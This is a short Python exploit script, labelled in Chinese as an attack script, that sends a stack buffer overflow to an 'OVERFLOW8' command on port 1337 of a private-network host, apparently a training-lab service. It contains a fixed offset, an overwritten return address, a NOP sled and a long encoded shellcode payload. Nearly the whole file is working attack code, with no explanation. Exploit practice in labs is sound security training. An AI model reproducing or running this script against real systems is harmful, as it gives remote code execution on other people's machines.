#coding=utf-8
#!/usr/bin/python

#攻击脚本

import socket

ip = "10.10.16.52"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786 
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"

padding = "\x90" * 16

buf = ""
buf+="\xb8\xd6\x74\xd2\xa2\xda\xda\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
buf+="\x52\x83\xc6\x04\x31\x46\x0e\x03\x90\x7a\x30\x57\xe0\x6b\x36"
buf+="\x98\x18\x6c\x57\x10\xfd\x5d\x57\x46\x76\xcd\x67\x0c\xda\xe2"
buf+="\x0c\x40\xce\x71\x60\x4d\xe1\x32\xcf\xab\xcc\xc3\x7c\x8f\x4f"
buf+="\x40\x7f\xdc\xaf\x79\xb0\x11\xae\xbe\xad\xd8\xe2\x17\xb9\x4f"
buf+="\x12\x13\xf7\x53\x99\x6f\x19\xd4\x7e\x27\x18\xf5\xd1\x33\x43"
buf+="\xd5\xd0\x90\xff\x5c\xca\xf5\x3a\x16\x61\xcd\xb1\xa9\xa3\x1f"
buf+="\x39\x05\x8a\xaf\xc8\x57\xcb\x08\x33\x22\x25\x6b\xce\x35\xf2"
buf+="\x11\x14\xb3\xe0\xb2\xdf\x63\xcc\x43\x33\xf5\x87\x48\xf8\x71"
buf+="\xcf\x4c\xff\x56\x64\x68\x74\x59\xaa\xf8\xce\x7e\x6e\xa0\x95"
buf+="\x1f\x37\x0c\x7b\x1f\x27\xef\x24\x85\x2c\x02\x30\xb4\x6f\x4b"
buf+="\xf5\xf5\x8f\x8b\x91\x8e\xfc\xb9\x3e\x25\x6a\xf2\xb7\xe3\x6d"
buf+="\xf5\xed\x54\xe1\x08\x0e\xa5\x28\xcf\x5a\xf5\x42\xe6\xe2\x9e"
buf+="\x92\x07\x37\x30\xc2\xa7\xe8\xf1\xb2\x07\x59\x9a\xd8\x87\x86"
buf+="\xba\xe3\x4d\xaf\x51\x1e\x06\xda\xb4\x29\x0c\xb2\xb4\x29\xa1"
buf+="\x1f\x30\xcf\xab\x8f\x14\x58\x44\x29\x3d\x12\xf5\xb6\xeb\x5f"
buf+="\x35\x3c\x18\xa0\xf8\xb5\x55\xb2\x6d\x36\x20\xe8\x38\x49\x9e"
buf+="\x84\xa7\xd8\x45\x54\xa1\xc0\xd1\x03\xe6\x37\x28\xc1\x1a\x61"
buf+="\x82\xf7\xe6\xf7\xed\xb3\x3c\xc4\xf0\x3a\xb0\x70\xd7\x2c\x0c"
buf+="\x78\x53\x18\xc0\x2f\x0d\xf6\xa6\x99\xff\xa0\x70\x75\x56\x24"
buf+="\x04\xb5\x69\x32\x09\x90\x1f\xda\xb8\x4d\x66\xe5\x75\x1a\x6e"
buf+="\x9e\x6b\xba\x91\x75\x28\xda\x73\x5f\x45\x73\x2a\x0a\xe4\x1e"
buf+="\xcd\xe1\x2b\x27\x4e\x03\xd4\xdc\x4e\x66\xd1\x99\xc8\x9b\xab"
buf+="\xb2\xbc\x9b\x18\xb2\x94";



payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

